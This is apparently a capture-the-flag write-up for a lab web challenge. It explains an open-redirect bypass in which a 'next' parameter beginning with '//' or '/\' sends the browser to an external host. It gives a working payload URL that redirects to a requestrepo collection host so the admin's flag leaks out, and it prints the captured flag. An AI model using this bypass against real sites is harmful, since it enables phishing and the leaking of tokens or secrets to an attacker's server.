# My Note

## Exploit
https://12b4fbca4efb.pwnbox-lab.com/?next=/\6i19xxqm.requestrepo.com

## flag
```
pwnbox{1f261e3e51d941ce5ddfd94b1f3f1f0a}
```


# Author's Note
@Muntrive
Relative-path check bypass. next only has to start with /, then it becomes the redirect target — but //host also starts with / and is protocol-relative, so the browser resolves it to https://host. Payload: ?next=//evil.com/ (or /\evil.com). Reported to the admin, the flag returns as ?flag=.

